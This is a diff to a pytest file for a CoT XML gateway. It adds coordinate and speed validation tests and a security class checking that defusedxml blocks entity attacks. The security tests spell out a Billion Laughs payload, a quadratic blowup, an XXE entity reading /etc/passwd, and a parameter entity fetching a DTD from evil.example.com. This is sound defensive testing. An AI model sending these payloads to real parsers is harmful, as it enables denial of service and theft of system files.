@@ -13,6 +13,7 @@ from datetime import UTC, datetime
 from pathlib import Path
 
 import pytest
+from defusedxml import DefusedXmlException
 
 from lichen.gateway.compact_cot import (
     ChatPayload,
@@ -736,6 +737,50 @@ class TestParseXmlCot:
         with pytest.raises(ValueError, match="Cannot map"):
             parse_cot_xml(xml)
 
+    def test_parse_invalid_latitude(self) -> None:
+        """Latitude outside [-90, 90] raises ValueError."""
+        xml = """<event type="a-f-G-U-C" uid="TEST-1">
+          <point lat="999" lon="0" hae="0"/>
+        </event>"""
+
+        with pytest.raises(ValueError, match="Latitude 999.0 out of range"):
+            parse_cot_xml(xml)
+
+    def test_parse_invalid_longitude(self) -> None:
+        """Longitude outside [-180, 180] raises ValueError."""
+        xml = """<event type="a-f-G-U-C" uid="TEST-1">
+          <point lat="0" lon="200" hae="0"/>
+        </event>"""
+
+        with pytest.raises(ValueError, match="Longitude 200.0 out of range"):
+            parse_cot_xml(xml)
+
+    def test_parse_negative_speed(self) -> None:
+        """Negative speed raises ValueError."""
+        xml = """<event type="a-f-G-U-C" uid="TEST-1">
+          <point lat="0" lon="0" hae="0"/>
+          <detail>
+            <track course="45" speed="-5"/>
+          </detail>
+        </event>"""
+
+        with pytest.raises(ValueError, match="Speed .* cannot be negative"):
+            parse_cot_xml(xml)
+
+    def test_parse_course_normalization(self) -> None:
+        """Course >= 360 is normalized to [0, 360)."""
+        xml = """<event type="a-f-G-U-C" uid="TEST-1">
+          <point lat="0" lon="0" hae="0"/>
+          <detail>
+            <track course="400" speed="0"/>
+          </detail>
+        </event>"""
+
+        cot = parse_cot_xml(xml)
+        # 400 % 360 = 40 degrees
+        assert isinstance(cot.payload, PliPayload)
+        assert cot.payload.course_deg == pytest.approx(40.0, rel=0.01)
+
 
 class TestEncodeCompactCot:
     """Tests for encode_compact_cot() - CompactCot to binary."""
@@ -846,6 +891,102 @@ class TestCompressXmlCot:
         # Should achieve at least 15x compression
         ratio = xml_size / binary_size
         assert ratio > 15, f"Compression ratio {ratio:.1f}x is too low"
+
+
+class TestXmlSecurityMitigations:
+    """Tests verifying XML entity expansion attacks are blocked.
+
+    SECURITY: The gateway receives CoT XML from external ATAK systems over the
+    network. Without defusedxml, the standard xml.etree.ElementTree is vulnerable
+    to entity expansion attacks (Billion Laughs, Quadratic Blowup) that can cause
+    denial of service by exhausting memory.
+    """
+
+    def test_billion_laughs_attack_blocked(self) -> None:
+        """Billion Laughs entity expansion attack is blocked.
+
+        This attack uses nested entity definitions to create exponential
+        expansion (e.g., 10 entities each expanding to 10x the previous
+        results in 10^10 expansion).
+        """
+        # Classic Billion Laughs payload - would expand to ~1GB with stdlib
+        malicious_xml = """<?xml version="1.0"?>
+        <!DOCTYPE lolz [
+          <!ENTITY lol "lol">
+          <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
+          <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
+          <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
+          <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
+        ]>
+        <event type="a-f-G-U-C" uid="EVIL">&lol5;</event>"""
+
+        # defusedxml should raise an exception for DTD/entity usage
+        with pytest.raises(DefusedXmlException):
+            parse_cot_xml(malicious_xml)
+
+    def test_quadratic_blowup_attack_blocked(self) -> None:
+        """Quadratic Blowup attack using large entity repeated many times is blocked.
+
+        This attack defines one large entity and references it many times,
+        causing O(n^2) memory usage.
+        """
+        # Large entity repeated many times
+        big_entity = "A" * 10000
+        malicious_xml = f"""<?xml version="1.0"?>
+        <!DOCTYPE kaboom [
+          <!ENTITY big "{big_entity}">
+        ]>
+        <event type="a-f-G-U-C" uid="EVIL">
+          <point lat="0" lon="0" hae="0"/>
+          &big;&big;&big;&big;&big;&big;&big;&big;&big;&big;
+        </event>"""
+
+        with pytest.raises(DefusedXmlException):
+            parse_cot_xml(malicious_xml)
+
+    def test_external_entity_attack_blocked(self) -> None:
+        """External entity (XXE) attack attempting to read local files is blocked."""
+        malicious_xml = """<?xml version="1.0"?>
+        <!DOCTYPE foo [
+          <!ENTITY xxe SYSTEM "file:///etc/passwd">
+        ]>
+        <event type="a-f-G-U-C" uid="EVIL">
+          <point lat="0" lon="0" hae="0"/>
+          <detail><remarks>&xxe;</remarks></detail>
+        </event>"""
+
+        with pytest.raises(DefusedXmlException):
+            parse_cot_xml(malicious_xml)
+
+    def test_parameter_entity_attack_blocked(self) -> None:
+        """Parameter entity expansion attack is blocked."""
+        malicious_xml = """<?xml version="1.0"?>
+        <!DOCTYPE foo [
+          <!ENTITY % pe SYSTEM "http://evil.example.com/xxe.dtd">
+          %pe;
+        ]>
+        <event type="a-f-G-U-C" uid="EVIL">
+          <point lat="0" lon="0" hae="0"/>
+        </event>"""
+
+        with pytest.raises(DefusedXmlException):
+            parse_cot_xml(malicious_xml)
+
+    def test_valid_xml_without_entities_still_works(self) -> None:
+        """Normal CoT XML without any entity definitions parses correctly."""
+        valid_xml = """<?xml version="1.0" encoding="UTF-8"?>
+        <event type="a-f-G-U-C" uid="ALPHA-1">
+          <point lat="47.606" lon="-122.332" hae="158"/>
+          <detail>
+            <__group name="Blue" role="Team Lead"/>
+            <track course="270" speed="1.2"/>
+          </detail>
+        </event>"""
+
+        cot = parse_cot_xml(valid_xml)
+        assert cot.subtype == CompactCotType.FRIENDLY_PLI
+        assert isinstance(cot.payload, PliPayload)
+        assert cot.payload.lat_deg == pytest.approx(47.606, rel=1e-5)
 
 
 class TestFullRoundtrip:
